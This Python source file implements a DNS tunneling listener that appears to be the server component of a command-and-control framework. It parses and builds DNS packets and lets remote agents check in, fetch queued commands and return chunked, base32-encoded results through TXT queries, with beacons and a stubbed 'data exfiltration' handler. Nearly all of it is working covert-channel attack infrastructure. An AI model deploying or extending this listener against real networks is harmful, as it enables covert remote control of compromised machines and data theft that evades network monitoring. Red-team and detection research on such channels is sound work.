"""
DNS listener implementation for DNS tunneling
"""

import asyncio
import base64
import json
import struct
import random
from typing import Dict, Any, Tuple, Optional, List
from datetime import datetime
from enum import IntEnum

from core.database import SessionLocal
from core.models import Agent, Task
from api.agents import agent_checkin

# DNS constants
class DNSType(IntEnum):
    A = 1
    NS = 2
    CNAME = 5
    SOA = 6
    PTR = 12
    MX = 15
    TXT = 16
    AAAA = 28

class DNSClass(IntEnum):
    IN = 1

class DNSOpcode(IntEnum):
    QUERY = 0
    IQUERY = 1
    STATUS = 2

class DNSResponseCode(IntEnum):
    NOERROR = 0
    FORMERR = 1
    SERVFAIL = 2
    NXDOMAIN = 3
    NOTIMP = 4
    REFUSED = 5

class DNSListener:
    """DNS listener for covert channel communications"""
    
    def __init__(self, listener_id: str, bind_address: str, bind_port: int, configuration: Dict[str, Any]):
        self.listener_id = listener_id
        self.bind_address = bind_address
        self.bind_port = bind_port
        self.configuration = configuration
        
        # DNS configuration
        self.domain = configuration.get('domain', 'example.com')
        self.ns_records = configuration.get('ns_records', ['ns1.example.com', 'ns2.example.com'])
        self.soa_email = configuration.get('soa_email', 'admin.example.com')
        self.ttl = configuration.get('ttl', 300)
        
        # Protocol configuration
        self.max_label_length = 63  # DNS label length limit
        self.max_domain_length = 253  # DNS domain length limit
        self.chunk_size = configuration.get('chunk_size', 50)  # Data per subdomain
        
        # Server state
        self.server = None
        self.transport = None
        
        # Message buffers for multi-packet messages
        self.incoming_messages = {}  # message_id -> {chunks, total_chunks, data}
        self.outgoing_messages = {}  # agent_id -> [messages]
        
        # Session tracking
        self.agent_sessions = {}  # transaction_id -> agent_id
    
    def encode_data(self, data: bytes) -> str:
        """Encode data for DNS subdomain"""
        # Use base32 encoding (DNS-safe)
        encoded = base64.b32encode(data).decode('ascii').lower()
        # Remove padding
        encoded = encoded.rstrip('=')
        # Replace any remaining non-DNS characters
        encoded = encoded.replace('/', '-')
        return encoded
    
    def decode_data(self, encoded: str) -> bytes:
        """Decode data from DNS subdomain"""
        # Restore padding
        padding = (8 - len(encoded) % 8) % 8
        encoded = encoded.upper() + '=' * padding
        # Replace DNS-safe characters back
        encoded = encoded.replace('-', '/')
        # Decode base32
        return base64.b32decode(encoded)
    
    def split_data(self, data: bytes, message_id: str) -> List[str]:
        """Split data into DNS-compliant chunks"""
        chunks = []
        total_chunks = (len(data) + self.chunk_size - 1) // self.chunk_size
        
        for i in range(0, len(data), self.chunk_size):
            chunk = data[i:i + self.chunk_size]
            encoded_chunk = self.encode_data(chunk)
            
            # Format: <message_id>.<chunk_num>.<total_chunks>.<data>
            chunk_domain = f"{message_id}.{i // self.chunk_size}.{total_chunks}.{encoded_chunk}"
            
            # Ensure it fits in DNS limits
            if len(chunk_domain) > self.max_label_length:
                # Split into multiple labels
                parts = []
                while chunk_domain:
                    parts.append(chunk_domain[:self.max_label_length])
                    chunk_domain = chunk_domain[self.max_label_length:]
                chunk_domain = '.'.join(parts)
            
            chunks.append(chunk_domain)
        
        return chunks
    
    def parse_dns_query(self, data: bytes) -> Tuple[int, List[Tuple[str, int, int]]]:
        """Parse DNS query packet"""
        # DNS header
        transaction_id = struct.unpack('!H', data[0:2])[0]
        flags = struct.unpack('!H', data[2:4])[0]
        qdcount = struct.unpack('!H', data[4:6])[0]
        
        # Parse questions
        offset = 12
        questions = []
        
        for _ in range(qdcount):
            # Parse domain name
            domain_parts = []
            while True:
                length = data[offset]
                offset += 1
                
                if length == 0:
                    break
                elif length & 0xC0 == 0xC0:
                    # Compression pointer
                    pointer = struct.unpack('!H', data[offset-1:offset+1])[0] & 0x3FFF
                    offset += 1
                    # For simplicity, we won't follow pointers
                    break
                else:
                    domain_parts.append(data[offset:offset+length].decode('ascii'))
                    offset += length
            
            domain = '.'.join(domain_parts)
            
            # Parse type and class
            qtype = struct.unpack('!H', data[offset:offset+2])[0]
            qclass = struct.unpack('!H', data[offset+2:offset+4])[0]
            offset += 4
            
            questions.append((domain, qtype, qclass))
        
        return transaction_id, questions
    
    def build_dns_response(self, transaction_id: int, questions: List[Tuple[str, int, int]], 
                          answers: List[Tuple[str, int, int, int, bytes]]) -> bytes:
        """Build DNS response packet"""
        # DNS header
        flags = 0x8180  # Response, Authoritative
        
        header = struct.pack('!HHHHHH',
            transaction_id,
            flags,
            len(questions),    # QDCOUNT
            len(answers),      # ANCOUNT
            0,                 # NSCOUNT
            0                  # ARCOUNT
        )
        
        # Build questions section
        question_data = b''
        for domain, qtype, qclass in questions:
            # Encode domain
            for part in domain.split('.'):
                if part:
                    question_data += struct.pack('!B', len(part))
                    question_data += part.encode('ascii')
            question_data += b'\x00'
            question_data += struct.pack('!HH', qtype, qclass)
        
        # Build answers section
        answer_data = b''
        for domain, rtype, rclass, ttl, rdata in answers:
            # Encode domain (with compression)
            answer_data += b'\xc0\x0c'  # Pointer to first question
            answer_data += struct.pack('!HHIH', rtype, rclass, ttl, len(rdata))
            answer_data += rdata
        
        return header + question_data + answer_data
    
    async def handle_agent_query(self, domain: str, qtype: int, transaction_id: int) -> Optional[bytes]:
        """Handle agent DNS query"""
        # Check if this is for our domain
        if not domain.endswith(f'.{self.domain}'):
            return None
        
        # Extract subdomain
        subdomain = domain[:-len(f'.{self.domain}') - 1]
        if not subdomain:
            return None
        
        # Parse subdomain parts
        parts = subdomain.split('.')
        
        # Handle different query patterns
        if parts[0] == 'checkin':
            return await self.handle_checkin_query(parts[1:], transaction_id)
        elif parts[0] == 'task':
            return await self.handle_task_query(parts[1:], transaction_id)
        elif parts[0] == 'result':
            return await self.handle_result_query(parts[1:], transaction_id)
        elif parts[0] == 'beacon':
            return await self.handle_beacon_query(parts[1:], transaction_id)
        else:
            # Data exfiltration query
            return await self.handle_data_query(parts, transaction_id)
    
    async def handle_checkin_query(self, parts: List[str], transaction_id: int) -> bytes:
        """Handle agent check-in via DNS"""
        if len(parts) < 2:
            return self.build_error_response()
        
        try:
            # Decode agent data
            agent_data = self.decode_data('.'.join(parts))
            agent_info = json.loads(agent_data)
            
            # Create check-in
            db = SessionLocal()
            try:
                from core.schemas import AgentCheckIn
                checkin_data = AgentCheckIn(**agent_info)
                result = await agent_checkin(checkin_data, db)
                
                # Store agent session
                if result.get('agent_id'):
                    self.agent_sessions[transaction_id] = result['agent_id']
                
                # Encode response
                response_data = json.dumps({
                    'agent_id': result.get('agent_id'),
                    'tasks': len(result.get('tasks', [])),
                    'sleep': result.get('sleep_interval', 60)
                }).encode()
                
                # Return as TXT record
                return self.build_txt_response(response_data)
                
            finally:
                db.close()
                
        except Exception as e:
            print(f"DNS checkin error: {e}")
            return self.build_error_response()
    
    async def handle_task_query(self, parts: List[str], transaction_id: int) -> bytes:
        """Handle task request via DNS"""
        if len(parts) < 1:
            return self.build_error_response()
        
        agent_id = self.agent_sessions.get(transaction_id)
        if not agent_id:
            # Try to decode agent_id from query
            try:
                agent_id = self.decode_data(parts[0]).decode()
            except:
                return self.build_error_response()
        
        # Get pending tasks
        db = SessionLocal()
        try:
            tasks = db.query(Task).filter(
                Task.agent_id == agent_id,
                Task.status == "pending"
            ).limit(1).all()
            
            if tasks:
                task = tasks[0]
                task.status = "sent"
                task.sent_at = datetime.utcnow()
                db.commit()
                
                # Encode task
                task_data = json.dumps({
                    'id': task.id,
                    'command': task.command,
                    'parameters': json.loads(task.parameters) if task.parameters else {}
                }).encode()
                
                # Split into chunks if needed
                if len(task_data) > 200:
                    # Store for multi-query retrieval
                    message_id = f"t{task.id[:8]}"
                    chunks = self.split_data(task_data, message_id)
                    self.outgoing_messages[agent_id] = chunks
                    
                    # Return first chunk indicator
                    return self.build_txt_response(f"MULTI:{message_id}:{len(chunks)}".encode())
                else:
                    # Return full task
                    return self.build_txt_response(task_data)
            else:
                # No tasks
                return self.build_txt_response(b"NOTASK")
                
        finally:
            db.close()
    
    async def handle_result_query(self, parts: List[str], transaction_id: int) -> bytes:
        """Handle task result via DNS"""
        if len(parts) < 3:
            return self.build_error_response()
        
        try:
            message_id = parts[0]
            chunk_num = int(parts[1])
            total_chunks = int(parts[2])
            
            # Decode chunk data
            if len(parts) > 3:
                chunk_data = self.decode_data('.'.join(parts[3:]))
            else:
                chunk_data = b''
            
            # Handle multi-chunk messages
            if message_id not in self.incoming_messages:
                self.incoming_messages[message_id] = {
                    'chunks': {},
                    'total_chunks': total_chunks,
                    'timestamp': datetime.utcnow()
                }
            
            self.incoming_messages[message_id]['chunks'][chunk_num] = chunk_data
            
            # Check if we have all chunks
            if len(self.incoming_messages[message_id]['chunks']) == total_chunks:
                # Reassemble message
                full_data = b''
                for i in range(total_chunks):
                    full_data += self.incoming_messages[message_id]['chunks'][i]
                
                # Process result
                try:
                    result = json.loads(full_data)
                    
                    # Submit to database
                    db = SessionLocal()
                    try:
                        from api.tasks import submit_task_result
                        from core.schemas import TaskResult
                        
                        task_id = result.pop('task_id')
                        result_data = TaskResult(**result)
                        await submit_task_result(task_id, result_data, db)
                        
                    finally:
                        db.close()
                    
                    # Clean up
                    del self.incoming_messages[message_id]
                    
                    return self.build_txt_response(b"ACK")
                    
                except Exception as e:
                    print(f"Result processing error: {e}")
                    return self.build_error_response()
            else:
                # Acknowledge chunk
                return self.build_txt_response(f"CHUNK:{chunk_num}".encode())
                
        except Exception as e:
            print(f"DNS result error: {e}")
            return self.build_error_response()
    
    async def handle_beacon_query(self, parts: List[str], transaction_id: int) -> bytes:
        """Handle simple beacon/heartbeat"""
        agent_id = self.agent_sessions.get(transaction_id)
        if agent_id:
            # Update last seen
            db = SessionLocal()
            try:
                agent = db.query(Agent).filter(Agent.id == agent_id).first()
                if agent:
                    agent.last_seen = datetime.utcnow()
                    db.commit()
            finally:
                db.close()
        
        return self.build_txt_response(b"PONG")
    
    async def handle_data_query(self, parts: List[str], transaction_id: int) -> bytes:
        """Handle data exfiltration query"""
        # This would handle arbitrary data exfiltration
        # For now, return NXDOMAIN
        return None
    
    def build_txt_response(self, data: bytes) -> bytes:
        """Build TXT record response data"""
        # TXT record format: length byte + data
        txt_data = b''
        
        # Split into 255-byte chunks (TXT record limit)
        for i in range(0, len(data), 255):
            chunk = data[i:i+255]
            txt_data += struct.pack('!B', len(chunk)) + chunk
        
        return txt_data
    
    def build_error_response(self) -> bytes:
        """Build error response"""
        return self.build_txt_response(b"ERROR")
    
    async def process_query(self, data: bytes, addr: Tuple[str, int]) -> bytes:
        """Process incoming DNS query"""
        try:
            transaction_id, questions = self.parse_dns_query(data)
            answers = []
            
            for domain, qtype, qclass in questions:
                # We only handle IN class
                if qclass != DNSClass.IN:
                    continue
                
                # Handle different query types
                if qtype == DNSType.A:
                    # Return our IP for A queries
                    ip = self.configuration.get('response_ip', '127.0.0.1')
                    ip_bytes = struct.pack('!BBBB', *map(int, ip.split('.')))
                    answers.append((domain, DNSType.A, DNSClass.IN, self.ttl, ip_bytes))
                    
                elif qtype == DNSType.TXT:
                    # Handle agent queries via TXT
                    response_data = await self.handle_agent_query(domain, qtype, transaction_id)
                    if response_data:
                        answers.append((domain, DNSType.TXT, DNSClass.IN, self.ttl, response_data))
                    
                elif qtype == DNSType.NS:
                    # Return NS records
                    for ns in self.ns_records:
                        ns_data = self.encode_domain(ns)
                        answers.append((domain, DNSType.NS, DNSClass.IN, self.ttl, ns_data))
                
                elif qtype == DNSType.SOA:
                    # Return SOA record
                    soa_data = self.build_soa_record()
                    answers.append((domain, DNSType.SOA, DNSClass.IN, self.ttl, soa_data))
            
            # Build response
            if answers:
                return self.build_dns_response(transaction_id, questions, answers)
            else:
                # NXDOMAIN
                return self.build_nxdomain_response(transaction_id, questions)
                
        except Exception as e:
            print(f"DNS query processing error: {e}")
            # Return SERVFAIL
            return self.build_servfail_response(data[:2])
    
    def encode_domain(self, domain: str) -> bytes:
        """Encode domain name for DNS response"""
        encoded = b''
        for part in domain.split('.'):
            if part:
                encoded += struct.pack('!B', len(part))
                encoded += part.encode('ascii')
        encoded += b'\x00'
        return encoded
    
    def build_soa_record(self) -> bytes:
        """Build SOA record data"""
        mname = self.encode_domain(self.ns_records[0])
        rname = self.encode_domain(self.soa_email.replace('@', '.'))
        
        # SOA parameters
        serial = int(datetime.utcnow().timestamp())
        refresh = 7200
        retry = 3600
        expire = 1209600
        minimum = 3600
        
        return mname + rname + struct.pack('!IIIII', serial, refresh, retry, expire, minimum)
    
    def build_nxdomain_response(self, transaction_id: int, questions: List[Tuple[str, int, int]]) -> bytes:
        """Build NXDOMAIN response"""
        flags = 0x8183  # Response, Authoritative, NXDOMAIN
        
        header = struct.pack('!HHHHHH',
            transaction_id,
            flags,
            len(questions),
            0,  # ANCOUNT
            0,  # NSCOUNT
            0   # ARCOUNT
        )
        
        # Include questions
        question_data = b''
        for domain, qtype, qclass in questions:
            for part in domain.split('.'):
                if part:
                    question_data += struct.pack('!B', len(part))
                    question_data += part.encode('ascii')
            question_data += b'\x00'
            question_data += struct.pack('!HH', qtype, qclass)
        
        return header + question_data
    
    def build_servfail_response(self, transaction_id_bytes: bytes) -> bytes:
        """Build SERVFAIL response"""
        transaction_id = struct.unpack('!H', transaction_id_bytes)[0]
        flags = 0x8182  # Response, SERVFAIL
        
        return struct.pack('!HHHHHH',
            transaction_id,
            flags,
            0,  # QDCOUNT
            0,  # ANCOUNT
            0,  # NSCOUNT
            0   # ARCOUNT
        )
    
    async def start(self):
        """Start the DNS listener"""
        print(f"DNS Listener starting on {self.bind_address}:{self.bind_port}")
        print(f"Domain: {self.domain}")
        
        # Create UDP endpoint
        loop = asyncio.get_event_loop()
        transport, protocol = await loop.create_datagram_endpoint(
            lambda: DNSProtocol(self),
            local_addr=(self.bind_address, self.bind_port)
        )
        
        self.transport = transport
        
        # Cleanup old messages periodically
        asyncio.create_task(self.cleanup_task())
        
        # Keep running
        try:
            while True:
                await asyncio.sleep(1)
        except asyncio.CancelledError:
            transport.close()
    
    async def cleanup_task(self):
        """Clean up old message buffers"""
        while True:
            try:
                await asyncio.sleep(300)  # Every 5 minutes
                
                # Clean up old incoming messages
                now = datetime.utcnow()
                expired = []
                
                for msg_id, msg_data in self.incoming_messages.items():
                    if (now - msg_data['timestamp']).total_seconds() > 600:  # 10 minutes
                        expired.append(msg_id)
                
                for msg_id in expired:
                    del self.incoming_messages[msg_id]
                
                # Clean up old agent sessions
                # (In production, this would be more sophisticated)
                
            except Exception as e:
                print(f"Cleanup error: {e}")
    
    async def stop(self):
        """Stop the DNS listener"""
        if self.transport:
            self.transport.close()
        
        print("DNS Listener stopped")

class DNSProtocol(asyncio.DatagramProtocol):
    """DNS protocol handler"""
    
    def __init__(self, listener: DNSListener):
        self.listener = listener
        self.transport = None
    
    def connection_made(self, transport):
        """Called when connection is made"""
        self.transport = transport
        self.listener.transport = transport
    
    def datagram_received(self, data: bytes, addr: Tuple[str, int]):
        """Handle incoming DNS query"""
        # Process query asynchronously
        asyncio.create_task(self._handle_query(data, addr))
    
    async def _handle_query(self, data: bytes, addr: Tuple[str, int]):
        """Process query and send response"""
        try:
            response = await self.listener.process_query(data, addr)
            if response and self.transport:
                self.transport.sendto(response, addr)
        except Exception as e:
            print(f"Query handling error: {e}")
    
    def error_received(self, exc):
        """Handle errors"""
        print(f"DNS Protocol error: {exc}")
    
    def connection_lost(self, exc):
        """Handle connection loss"""
        if exc:
            print(f"DNS Protocol connection lost: {exc}")
